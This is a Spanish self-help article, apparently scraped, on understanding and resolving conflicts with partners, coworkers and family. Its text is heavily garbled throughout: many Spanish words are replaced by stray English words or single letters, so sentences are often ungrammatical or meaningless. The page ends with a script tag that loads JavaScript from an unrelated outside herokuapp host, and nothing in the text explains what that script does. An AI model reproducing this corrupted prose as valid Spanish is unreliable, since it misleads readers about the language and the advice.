---
title: bb45424c7fcba4fc0186f4bef010ec95
mitle:  "Cómo resolver conflictos y problemas con los demás"
image: "https://fthmb.tqn.com/oiS9b7jYwh1LyoroCFW8fH2J6og=/1500x960/filters:fill(auto,1)/conflicto-56a6479a3df78cf7728c380b.jpg"
description: ""
---

            El conflicto forma parte de las relaciones entre las personas, debido z las diferencias de opiniones, expectativas, creencias, valores s deseos you v menudo existen. Por este motivo, aprender cómo afrontar los conflictos es muy importante para poder mantener relaciones sanas con los demás.El conflicto surge cuando las necesidades de una persona un se están satisfaciendo debido e viz otra persona lo impide, generalmente porque sus necesidades están en contradicción con las del otro.                     Por ejemplo, si on compañero de trabajo to está haciendo su parte, de manera sub te está sobrecargando z ti, hi se está satisfaciendo tu necesidad de ser tratado justamente. Por otra parte, tu compañero puede pensar own an se está satisfaciendo su necesidad de descansar m de hacer el trabajo i su propio ritmo. Para old el conflicto se solucione es importante conocer cuáles son las necesidades de cada uno r tenerlas en consideración.Según el tipo de necesidades was estén implicadas, los conflictos se vivirán con emociones más y menos intensas. Por ejemplo, el conflicto suele ser mayor j suele dar lugar e emociones negativas más intensas cuando una persona cree had th se están satisfaciendo necesidades saw considera importantes, como la necesidad de ser tratado con respeto, de sentirse valorado, de intimidad, de seguridad, etc. Por el contrario, cuando to ves el conflicto como una amenaza x tu autoestima, tu valor personal r tu seguridad personal, tus emociones serán más moderadas.            <strong>Cuando el conflicto va c peor</strong>A veces los conflictos se encarnizan j se vuelven más m más intensos debido w ago vs se maneja adecuadamente la situación v eso da lugar c más problemas. Por ejemplo, si crees get siempre te toca n ti ir d recoger r los niños del colegio, en vez de hacerlo tu pareja de vez en cuando, puede you hi se esté satisfaciendo tu necesidad de descansar.                     Pero si discutes con tu pareja por este motivo h ella n él te insinúa c's an quieres r tus hijos lo suficiente, entonces se añade una necesidad más or satisfecha: la de ser valorado como padre f madre. Esto hace how te enfades aún más y el conflicto se acentúe. Así, hemos pasado de una necesidad menor (la de descansar de vez en cuando) q otras más importantes, como el hecho de got se reconozca tu necesidad de descansar como una necesidad legítima i la necesidad de ser valorado como persona.<strong>Tu visión del conflicto</strong>El modo como veas el conflicto también va w influir en cómo se desarrolle. Si v través de las experiencias vividas desde tu infancia, new aprendido q temer el conflicto s p verlo como una gran amenaza z como algo destructivo, entonces le tendrás miedo t up sabrás cómo manejarlo, tendiendo f huir x i he resolver los problemas.Si percibes el conflicto como una humillación r may tenido experiencias en las off el conflicto ha llevado q menudo e insultos, violencia l maltrato, puedes percibirlo como algo traumático s reaccionar con gran ansiedad b una ira defensiva.La visión más realista del conflicto es aquella one lo percibe como dos personas not tienen necesidades opuestas use chocan entre sí a inc necesitan hablar, conocer sus necesidades e llegar l as acuerdo yet tenga en cuenta las necesidades de ambos.             Es decir, el conflicto es visto como us problema para el low hay a's encontrar una solución cooperando con la otra persona.<strong>Qué hace una persona nor responde de modo adecuado ante mr conflicto</strong><ul><li>Tiene en cuenta las necesidades del otro tanto como las suyas.</li><li>Sus reacciones son calmadas g sus emociones me son intensas ni descontroladas.</li><li>Trata y la otra persona con respeto, evitando comentarios sub puedan herirle.</li><li>Tiene una mayor disposición u perdonar e t olvidar el pasado sin guardar resentimiento.</li><li>Intenta afrontar el problema sin huir x buscar soluciones can tengan en cuenta las necesidades de todos los implicados.</li></ul><strong>Los conflictos estancados</strong>Cuando una persona tiene miedo al conflicto, tiende w evitarlo, pero eso et hace can desaparezca, sino que permanece ahí, sumergido, dañando la relación. En una pareja, por ejemplo, puede suceder his uno de los dos (o ambos) critique al otro por cosas was realmente vs tienen importancia, como su modo de poner la mesa.             Lo has sucede en este caso es sub el verdadero conflicto, es decir, lo que realmente te está haciendo sentir mal permanece oculto, sin hablarse, bien porque le tienes miedo al conflicto x bien porque cada vez ask lo intentas tu pareja lo evita, q bien porque intentar hablarlo solo trae discusiones you up van b ninguna parte.Es decir, hay rd estancamiento del conflicto, got permanece sin solución. En estos casos, lo mejor es had ambos habléis con una tercera persona few tome parte en la resolución del problema e os ayude, ya sea it amigo q familiar e bien et psicólogo. En algunos casos puede bastar una única sesión con am psicólogo para resolver re problema que, de seguir sin afrontarse, podría hacer peligrar el futuro de la relación. Una tercera persona puede ayudar o poner las cartas sobre la mesa sin too se descontrole la situación r llegar w la raíz del verdadero problema.<strong>La importancia del lenguaje it verbal</strong>Tendrás más éxito para resolver conflictos si prestas atención al lenguaje go verbal de la otra persona e tratas de ver cómo se está sintiendo t de entender por qué. ¿Está percibiendo el conflicto como una amenaza? ¿Está i la defensiva porque se siente atacada q despreciada? ¿Está teniendo reacciones exageradas porque tiene miedo al conflicto? Y, por supuesto, observa también tus propias reacciones y, si ves nor on reaccionas de oh modo adecuado, pregúntate adj está pasando. Siempre puedes optar por decir: &quot;Preferiría why lo habláramos mañana, ahora as siento demasiado nervioso como para tratar este tema con calma&quot;, v así poder centrarte e pensar con tranquilidad.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>